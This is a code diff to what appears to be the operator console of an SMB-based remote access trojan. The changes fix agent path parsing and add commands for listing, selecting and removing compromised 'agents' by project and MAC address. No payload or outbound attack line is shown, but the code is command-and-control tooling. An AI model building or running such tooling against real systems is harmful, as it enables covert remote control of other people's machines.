@@ -49,6 +49,7 @@ def initialize(share_folder) :
 	global Share
 	Share = share_folder
 
+	#Changed os.listdir to os.walk which returns [path/of/dir, [tupple, of, directories], [tuple, of, files]]
 	for root, projects, files in os.walk(share_folder):
 		for project in projects:
 			Sessions[project] = {}
@@ -85,6 +86,7 @@ class SessionHandler(FileSystemEventHandler) :
 	def on_deleted(self, event):
 		if event.src_path.endswith(EXEC_DAT):
 			# event.src_path: <Share>/<ProjectName>/<Agent-MAC>/<file_deleted>
+			# changed event.src_path.split(os.sep)[-1:-1] to event.src_path.split(os.sep)[-3:-1]
 			project, agent = event.src_path.split(os.sep)[-3:-1]
 			output_dat = get_output_path(project, agent)
 			with open(output_dat, 'r') as output_file:
@@ -109,29 +111,76 @@ class SMBRatShell(cmd.Cmd) :
 	# def do_EOF(self, *args): return ''
 	def emptyline(self, *args): return ''
 
-	def do_session(self, line):
+	def do__session(self, line):
 		pprint.pprint(self.session_dict)
 		pass
 
-	def do_selected(self, line):
+	# Change selected command to agents command
+	def do_agents(self, line):
 		"""
 > selected
 
 Shows the list of Selected Agents
 
 		"""
-		arg_parser = CLIArgumentParser()
+		
+		arg_parser = CLIArgumentParser(description = 'List all available agents')
 		arg_parser.add_argument('--add', '-a', help = 'Add an Agent to the "selected" list', nargs = '+')
 		arg_parser.add_argument('--remove', '-r', help = 'Remove an Agent from the "selected" list', nargs = '+')
-		# arg_parser.add_argument('--list', '-l', help = 'List all available agents', action = store_true)
+		arg_parser.add_argument('--active', help = 'List all active agents', action = 'store_true')
+		arg_parser.add_argument('--selected', '-s', help = 'List all selected agents', action = 'store_true')
+		arg_parser.add_argument('--list', '-l', help = 'List all available agents', action = 'store_true')
 		args = arg_parser.parse_args(line.split())
+		
+		if args.list:
+			for project in  self.session_dict.keys():
+				for agent in self.session_dict[project].keys():
+					print ("{}/{}".format(project, agent))
+			return
+
+
 		if args.add:
-			print(args.add)
-		if not self.selected:
-			print ("No agents selected!")
-			return ""
-		for project, agent in self.selected:
-			print ("{project} / {agent}".format(project = project, agent = agent))
+			for add_arg in args.add:
+				try:
+					int_add_arg = int(add_arg)
+				except ValueError as ve:
+					if add_arg.count('/') != 1:
+						print("Invalid argument: '{}'. projectName/agent".format(add_arg))
+						continue
+					project, agent = add_arg.split('/', 1)
+					try:
+						self.session_dict[project][agent]
+					except:
+						print ("Agent '{}/{}' not found".format(project, agent))
+						continue					
+					self.selected.add( (project, agent) )
+					
+
+		if args.remove:
+			for rem_arg in args.remove:
+				try:
+					int_rem_arg = int(rem_arg)
+
+				except ValueError as ve:
+					if rem_arg.count('/') != 1:
+						print("Invalid argument: '{}'. projectName/agent".format(rem_arg))
+						continue
+					project, agent = rem_arg.split('/', 1)
+					try:
+						self.selected.remove( (project, agent) )
+					except:
+						print ("Agent '{}/{}' not found".format(project, agent))
+						continue
+
+		if args.active:
+			print("not yet implemented")
+
+		if args.selected:
+			if not self.selected:
+				print ("No agents selected!")
+				return ""
+			for project, agent in self.selected:
+				print ("-> {project}/{agent}".format(project = project, agent = agent))
 
 
 	def do_execall(self, line):
